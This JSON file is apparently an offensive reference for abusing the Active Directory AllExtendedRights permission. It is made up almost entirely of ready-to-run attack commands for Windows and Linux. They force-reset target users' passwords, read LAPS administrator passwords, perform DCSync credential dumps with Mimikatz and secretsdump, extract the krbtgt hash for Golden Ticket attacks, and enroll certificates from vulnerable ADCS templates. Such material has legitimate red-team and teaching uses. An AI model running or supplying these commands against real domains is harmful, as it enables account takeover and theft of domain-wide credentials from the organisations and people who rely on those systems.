{
    "AllExtendedRights": {
        "meaning": "Extended rights are special rights granted on objects which allow reading of privileged attributes, as well as performing special actions. This privilege grants different capabilities depending on the target object: password reset for users, LAPS password reading for computers, DCSync for domains, and enrollment rights for certificate templates.",
        "common": "",
        "windows": {
            "PowerView_Users": [
                {
                    "order": 1,
                    "command": "Import-Module PowerView",
                    "description": "Import PowerView module"
                },
                {
                    "order": 2,
                    "command": "$SecPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force",
                    "description": "Create secure string for new password"
                },
                {
                    "order": 3,
                    "command": "Set-DomainUserPassword -Identity targetuser -AccountPassword $SecPassword",
                    "description": "Reset target user password using extended rights"
                }
            ],
            "PowerView_Computers": [
                {
                    "order": 1,
                    "command": "Import-Module PowerView",
                    "description": "Import PowerView module"
                },
                {
                    "order": 2,
                    "command": "Get-DomainComputer -Identity targetcomputer -Properties ms-mcs-admpwd",
                    "description": "Read LAPS password using extended rights"
                }
            ],
            "Mimikatz_Domain": [
                {
                    "order": 1,
                    "command": "lsadump::dcsync /domain:domain.com /all",
                    "description": "Perform DCSync attack using DS-Replication-Get-Changes rights"
                },
                {
                    "order": 2,
                    "command": "lsadump::dcsync /domain:domain.com /user:krbtgt",
                    "description": "Extract krbtgt hash for Golden Ticket attack"
                }
            ],
            "Certify_Templates": [
                {
                    "order": 1,
                    "command": "Certify.exe find /vulnerable",
                    "description": "Enumerate vulnerable certificate templates"
                },
                {
                    "order": 2,
                    "command": "Certify.exe request /ca:SERVER\\CA-NAME /template:TEMPLATE",
                    "description": "Enroll certificate using extended rights on template"
                }
            ]
        },
        "linux": {
            "Impacket_Users": [
                {
                    "order": 1,
                    "command": "python3 changepasswd.py domain.com/user:password@target -newpass 'NewPassword123!' -altuser targetuser",
                    "description": "Reset user password using extended rights via changepasswd"
                }
            ],
            "Impacket_Computers": [
                {
                    "order": 1,
                    "command": "python3 ldapdomaindump.py domain.com/user:password@dc.domain.com",
                    "description": "Dump LDAP information including LAPS passwords"
                },
                {
                    "order": 2,
                    "command": "ldapsearch -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'DC=domain,DC=com' '(objectClass=computer)' ms-mcs-admpwd",
                    "description": "Query LAPS passwords directly via LDAP"
                }
            ],
            "Impacket_Domain": [
                {
                    "order": 1,
                    "command": "python3 secretsdump.py domain.com/user:password@dc.domain.com -just-dc",
                    "description": "Perform DCSync attack using secretsdump"
                },
                {
                    "order": 2,
                    "command": "python3 secretsdump.py domain.com/user:password@dc.domain.com -just-dc-user krbtgt",
                    "description": "Extract specific user hash via DCSync"
                }
            ],
            "Certipy_Templates": [
                {
                    "order": 1,
                    "command": "certipy find -u user@domain.com -p password -target ca.domain.com",
                    "description": "Enumerate certificate templates and find vulnerable ones"
                },
                {
                    "order": 2,
                    "command": "certipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE",
                    "description": "Enroll certificate using extended rights on template"
                }
            ],
            "BloodyAD": [
                {
                    "order": 1,
                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get object 'CN=targetuser,CN=Users,DC=domain,DC=com' --attr pwdLastSet",
                    "description": "Check user password attributes"
                },
                {
                    "order": 2,
                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set password 'targetuser' 'NewPassword123!'",
                    "description": "Reset user password using extended rights"
                }
            ]
        }
    }
}
